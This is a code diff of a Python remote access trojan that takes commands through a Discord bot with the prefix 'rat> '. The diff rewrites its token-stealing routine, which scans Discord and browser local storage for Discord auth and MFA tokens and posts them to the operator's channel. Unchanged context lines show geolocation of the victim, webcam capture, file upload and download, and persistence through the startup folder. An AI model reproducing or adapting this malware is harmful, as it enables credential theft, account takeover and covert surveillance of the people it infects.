@@ -4,8 +4,8 @@ from requests import get
 from socket import create_connection
 
 # All the needed variables
-notification_channel = 11111111111111111
-bot_token = "1sngkmrglsgirmlgsoiemgslgmgrls"
+notification_channel = 01101110011101010110110001101100
+bot_token = "nullcode.yadayada.isthebest"
 bot_prefix = "rat> "
 
 client = commands.Bot(command_prefix=bot_prefix)
@@ -35,24 +35,8 @@ def EmbedGen(title_main, color, name, value):
         color2 = color
     embed = discord.Embed(title=title_main, color=color)
     embed.add_field(name=name, value=value)
-    embed.set_footer(text="Written by NullCode#1337")
+    embed.set_footer(text="Written by NullCode#0187")
     return embed
-
-def ft(p):
-    p += "\\Local Storage\\leveldb"
-    tokens = []
-    for file_name in os.listdir(p):
-        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
-            continue
-        for line in [
-            x.strip()
-            for x in open(f"{p}\\{file_name}", errors="ignore").readlines()
-            if x.strip()
-        ]:
-            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                for token in re.findall(regex, line):
-                    tokens.append(token)
-    return tokens
 
 @client.event
 async def on_ready():
@@ -106,7 +90,7 @@ async def geolocate(ctx):
     embed.add_field(name="Latitude", value=data["latitude"], inline=True)
     embed.add_field(name="Longitude", value=data["longitude"], inline=True)
     embed.add_field(name="Postal code", value=data["postal"], inline=True)
-    embed.set_footer(text="Written by NullCode#1337")
+    embed.set_footer(text="Written by NullCode#0187")
     await ctx.send(embed=embed)
 
 # Put payload in startup directory
@@ -143,31 +127,27 @@ async def token(ctx):
     local = os.getenv("LOCALAPPDATA")
     roaming = os.getenv("APPDATA")
     paths = {
-        "Discord": roaming + "\\Discord",
-        "Discord Canary": roaming + "\\discordcanary",
-        "Discord PTB": roaming + "\\discordptb",
-        "Lightcord": roaming + "\\Lightcord",
-        "Opera": roaming + "\\Opera Software\\Opera Stable",
-        "Opera GX": roaming + "\\Opera Software\\Opera GX Stable",
-        "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
-        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",
-        "Vivaldi": local + "\\Vivaldi\\User Data\\Default",
+        "Discord": roaming + "\\Discord",                                  "Discord Canary": roaming + "\\discordcanary",
+        "Discord PTB": roaming + "\\discordptb",                           "Lightcord": roaming + "\\Lightcord",
+        "Opera": roaming + "\\Opera Software\\Opera Stable",               "Opera GX": roaming + "\\Opera Software\\Opera GX Stable",
+        "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",   "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",   "Vivaldi": local + "\\Vivaldi\\User Data\\Default",
         "MSEdge": local + "\\Microsoft\\Edge\\User Data\\Default",
     }
+    tokens = []; tokens2 = []; message = ""
     for platform, path in paths.items():
-        if not os.path.exists(path):
-            continue
-        msg = f"\n**{platform}**\n```\n"
-        tokens = ft(path)
-        if len(tokens) > 0:
-            for token in tokens:
-                msg += f"{token}\n"
-        else:
-            msg += "No token found.\n"
-        msg += "```"
-        await ctx.send(msg)
-
+        path += '\\Local Storage\\leveldb'
+        try: 
+            for file_name in os.listdir(path):
+                if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
+                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                        for token in re.findall(regex, line): 
+                            tokens.append(token); tokens2.append(platform)
+        except FileNotFoundError: continue
+    for tks, tks2 in zip(tokens, tokens2): message += f"{tks2}: `{tks}`\n"
+    await ctx.send(message)
+    
 # Download and upload
 @client.command()
 async def upload(ctx, name, isBig="zzz"):
@@ -330,7 +310,7 @@ async def menu(ctx):
     embed.add_field(name="rat> webcam", value="Takes picture from webcam", inline=False)
     embed.add_field(name="rat> startup", value="Add payload to victim's startup", inline=False)
     embed.add_field(name="rat> exit <ip>", value="Shuts down bot", inline=False)
-    embed.set_footer(text="Written by NullCode#1337")
+    embed.set_footer(text="Written by NullCode#0187")
     await ctx.send(embed=embed)
 
 while is_connected() == False: a += 1
